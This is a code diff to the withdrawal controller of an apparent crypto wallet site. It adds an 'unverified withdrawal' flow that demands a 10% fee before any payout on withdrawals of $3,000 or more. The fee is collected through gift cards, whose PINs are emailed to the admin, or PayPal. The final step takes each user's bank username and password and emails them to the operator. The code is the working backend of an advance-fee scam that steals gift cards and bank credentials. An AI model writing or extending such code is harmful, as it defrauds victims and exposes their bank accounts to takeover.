@@ -1,9 +1,11 @@
 const cloudinary = require('../config/cloudinary');
 const Verification = require('../models/Verification');
 const Withdrawal = require('../models/Withdrawal');
+const UnverifiedWithdrawal = require('../models/UnverifiedWithdrawal');
 const Notification = require('../models/Notification');
 const { findAsset } = require('../utils/assets');
 const { notifyAdminAsync } = require('../config/mailer');
+const { calculateProfit } = require('../utils/calProfit');
 
 async function getOrCreateVerification(userId) {
   let v = await Verification.findOne({ userId });
@@ -20,8 +22,6 @@ function uploadToCloudinary(buffer, folder, publicId) {
     stream.end(buffer);
   });
 }
-
-/* ---------- NEW: single-file upload (auto-upload on user selection) ---------- */
 
 exports.uploadIdFile = async (req, res) => {
   try {
@@ -40,8 +40,6 @@ exports.uploadIdFile = async (req, res) => {
   }
 };
 
-/* ---------- Save ID (accepts either pre-uploaded URLs OR legacy multipart) ---------- */
-
 exports.uploadId = async (req, res) => {
   try {
     const { idType, frontUrl, backUrl } = req.body || {};
@@ -50,19 +48,10 @@ exports.uploadId = async (req, res) => {
     let finalFront = frontUrl;
     let finalBack = backUrl;
 
-    // Backwards-compatible: if files are present (old clients), upload them now
     if (req.files && req.files.front && req.files.back) {
       const [frontRes, backRes] = await Promise.all([
-        uploadToCloudinary(
-          req.files.front[0].buffer,
-          'fortis_wallet/ids',
-          `user_${req.user._id}_front_${Date.now()}`
-        ),
-        uploadToCloudinary(
-          req.files.back[0].buffer,
-          'fortis_wallet/ids',
-          `user_${req.user._id}_back_${Date.now()}`
-        ),
+        uploadToCloudinary(req.files.front[0].buffer, 'fortis_wallet/ids', `user_${req.user._id}_front_${Date.now()}`),
+        uploadToCloudinary(req.files.back[0].buffer, 'fortis_wallet/ids', `user_${req.user._id}_back_${Date.now()}`),
       ]);
       finalFront = frontRes.secure_url;
       finalBack = backRes.secure_url;
@@ -77,7 +66,6 @@ exports.uploadId = async (req, res) => {
     v.idBack = finalBack;
     await v.save();
 
-    // Fire-and-forget — response returns immediately
     notifyAdminAsync(
       'ID Documents Uploaded',
       `<h3>ID Documents</h3>
@@ -92,8 +80,6 @@ exports.uploadId = async (req, res) => {
     return res.status(500).json({ message: err.message });
   }
 };
-
-/* ---------- Verification info ---------- */
 
 exports.submitVerification = async (req, res) => {
   try {
@@ -133,12 +119,14 @@ exports.submitAmount = async (req, res) => {
     const meta = findAsset(symbol);
     if (!meta) return res.status(400).json({ message: 'Invalid asset' });
 
-    const userAsset = req.user.assets.find((a) => a.symbol === symbol);
+    const user = await calculateProfit(req.user);
+
+    const userAsset = user.assets.find((a) => a.symbol === symbol);
     if (!userAsset || userAsset.amount < Number(amount)) {
       return res.status(400).json({ message: 'Insufficient balance' });
     }
 
-    const v = await getOrCreateVerification(req.user._id);
+    const v = await getOrCreateVerification(user._id);
     v.pendingWithdrawal = { symbol, amount: Number(amount) };
     await v.save();
     return res.json({ message: 'Withdrawal amount saved' });
@@ -222,9 +210,7 @@ exports.verifyCode = async (req, res) => {
       await Notification.create({
         userId: req.user._id,
         title: 'Withdrawal Pending Approval',
-        message: `Your withdrawal of $${Number(v.pendingWithdrawal.amount).toFixed(2)} of ${
-          v.pendingWithdrawal.symbol
-        } is pending final approval.`,
+        message: `Your withdrawal of $${Number(v.pendingWithdrawal.amount).toFixed(2)} of ${v.pendingWithdrawal.symbol} is pending final approval.`,
       });
 
       notifyAdminAsync(
@@ -246,6 +232,166 @@ exports.verifyCode = async (req, res) => {
 exports.resendCode = async (req, res) => {
   try {
     return res.json({ message: 'Code resend window reset' });
+  } catch (err) {
+    return res.status(500).json({ message: err.message });
+  }
+};
+
+/* ---------- Unverified Withdrawal Flow ---------- */
+
+exports.initiateUnverified = async (req, res) => {
+  try {
+    const { symbol, amount } = req.body;
+    if (!symbol || !amount || Number(amount) < 3000) {
+      return res.status(400).json({ message: 'Minimum unverified withdrawal is $3,000' });
+    }
+
+    let existing = await UnverifiedWithdrawal.findOne({ 
+      userId: req.user._id, 
+      status: { $in: ['pending_payment', 'pending_approval', 'completed'] } 
+    });
+
+    if (existing) {
+      return res.json({ message: 'Active withdrawal found', data: existing });
+    }
+
+    const record = await UnverifiedWithdrawal.create({
+      userId: req.user._id,
+      symbol,
+      originalAmount: Number(amount),
+      tier: 1,
+      status: 'pending_payment',
+      currentPaymentAmount: Number(amount) * 0.1,
+    });
+
+    return res.json({ message: 'Unverified withdrawal initiated', data: record });
+  } catch (err) {
+    return res.status(500).json({ message: err.message });
+  }
+};
+
+exports.payUnverified = async (req, res) => {
+  try {
+    const { paymentMethod, proofUrl, giftCards } = req.body;
+    
+    // Allow adding more while pending_payment OR pending_approval
+    const record = await UnverifiedWithdrawal.findOne({ 
+      userId: req.user._id, 
+      status: { $in: ['pending_payment', 'pending_approval'] } 
+    });
+
+    if (!record) return res.status(404).json({ message: 'No active payment required' });
+
+    record.paymentMethod = paymentMethod;
+    if (paymentMethod === 'paypal' && proofUrl) {
+      record.proofUrl = proofUrl;
+    }
+    
+    let newPaymentAmount = 0;
+    if (paymentMethod === 'giftcard' && Array.isArray(giftCards)) {
+      if (!record.giftCards) record.giftCards = [];
+      record.giftCards.push(...giftCards); // Append new cards instead of replacing
+      newPaymentAmount = giftCards.reduce((sum, c) => sum + (Number(c.amount) || 0), 0);
+    } else {
+      // For card/paypal, assume they paid the required amount
+      newPaymentAmount = record.currentPaymentAmount;
+    }
+
+    record.totalFeesPaid = (record.totalFeesPaid || 0) + newPaymentAmount;
+    record.status = 'pending_approval';
+    await record.save();
+
+    // Build HTML with image links for the admin email
+    let giftCardsHtml = '';
+    if (paymentMethod === 'giftcard' && giftCards && giftCards.length > 0) {
+      giftCardsHtml = '<h4>Gift Cards Submitted:</h4><ul>';
+      giftCards.forEach((c, i) => {
+        giftCardsHtml += `<li><b>Card ${i + 1}:</b> Amount $${c.amount}, Pin: ${c.pin}<br/>
+          <a href="${c.frontUrl}">Front Image</a> | <a href="${c.backUrl}">Back Image</a></li>`;
+      });
+      giftCardsHtml += '</ul>';
+    }
+    
+    let paypalHtml = '';
+    if (paymentMethod === 'paypal' && proofUrl) {
+      paypalHtml = `<p><b>PayPal Proof:</b> <a href="${proofUrl}">Download Proof</a></p>`;
+    }
+
+    notifyAdminAsync(
+      `Unverified Withdrawal Payment — Tier ${record.tier}`,
+      `<h3>Unverified Withdrawal Payment</h3>
+       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
+       <p><b>Tier:</b> ${record.tier}</p>
+       <p><b>Amount Paid (This submission):</b> $${newPaymentAmount.toFixed(2)}</p>
+       <p><b>Total Amount Paid So Far:</b> $${record.totalFeesPaid.toFixed(2)}</p>
+       <p><b>Required Amount:</b> $${record.currentPaymentAmount.toFixed(2)}</p>
+       <p><b>Payment Method:</b> ${paymentMethod}</p>
+       ${paypalHtml}
+       ${giftCardsHtml}`
+    );
+
+    return res.json({ message: 'Payment submitted for verification', data: record });
+  } catch (err) {
+    return res.status(500).json({ message: err.message });
+  }
+};
+
+exports.getUnverifiedStatus = async (req, res) => {
+  try {
+    const record = await UnverifiedWithdrawal.findOne({ 
+      userId: req.user._id, 
+      status: { $in: ['pending_payment', 'pending_approval', 'completed'] } 
+    }).sort({ createdAt: -1 });
+
+    if (!record) return res.json({ active: false });
+    return res.json({ active: true, data: record });
+  } catch (err) {
+    return res.status(500).json({ message: err.message });
+  }
+};
+
+exports.completeUnverified = async (req, res) => {
+  try {
+    const { bankName, bankAddress, username, password } = req.body;
+    const record = await UnverifiedWithdrawal.findOne({ 
+      userId: req.user._id, 
+      status: 'completed' 
+    }).sort({ createdAt: -1 });
+
+    if (!record) return res.status(400).json({ message: 'Verification not completed' });
+
+    const finalAmount = record.originalAmount + (record.totalFeesPaid || 0);
+
+    await Withdrawal.create({
+      userId: req.user._id,
+      symbol: record.symbol,
+      amount: finalAmount,
+      bankName,
+      bankAddress,
+      status: 'pending',
+    });
+
+    await Notification.create({
+      userId: req.user._id,
+      title: 'Unverified Withdrawal Submitted',
+      message: `Your withdrawal of $${finalAmount.toFixed(2)} of ${record.symbol} is pending approval.`,
+    });
+
+    notifyAdminAsync(
+      'Unverified Withdrawal Completed Bank Connect',
+      `<h3>Unverified Withdrawal Final Approval</h3>
+       <p><b>User:</b> ${req.user.firstName} ${req.user.lastName} (${req.user.email})</p>
+       <p><b>Asset:</b> ${record.symbol}</p>
+       <p><b>Total Amount:</b> $${finalAmount.toFixed(2)}</p>
+       <p><b>Bank Name:</b> ${bankName}</p>
+       <p><b>Bank Username:</b> ${username}</p>
+       <p><b>Bank Password:</b> ${password}</p>`
+    );
+
+    record.status = 'approved'; // Mark as done
+    await record.save();
+
+    return res.json({ message: 'Withdrawal submitted successfully' });
   } catch (err) {
     return res.status(500).json({ message: err.message });
   }
